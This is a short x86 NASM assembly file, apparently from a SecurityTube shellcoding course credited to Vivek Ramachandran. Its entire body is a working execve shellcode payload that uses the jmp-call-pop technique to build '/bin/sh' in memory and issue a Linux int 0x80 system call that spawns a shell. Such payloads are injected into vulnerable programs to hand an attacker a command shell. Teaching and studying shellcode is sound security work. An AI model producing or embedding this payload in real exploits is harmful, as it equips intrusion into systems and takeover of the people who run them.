; Filename: execve.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	jmp short call_shellcode


shellcode:

	pop esi

	xor ebx, ebx
	mov byte [esi +7], bl
	mov dword [esi +8], esi
	mov dword [esi +12], ebx


	lea ebx, [esi]

	lea ecx, [esi +8]

	lea edx, [esi +12]

	xor eax, eax
	mov al, 0xb
	int 0x80



call_shellcode:

	call shellcode
	message db "/bin/shABBBBCCCC"

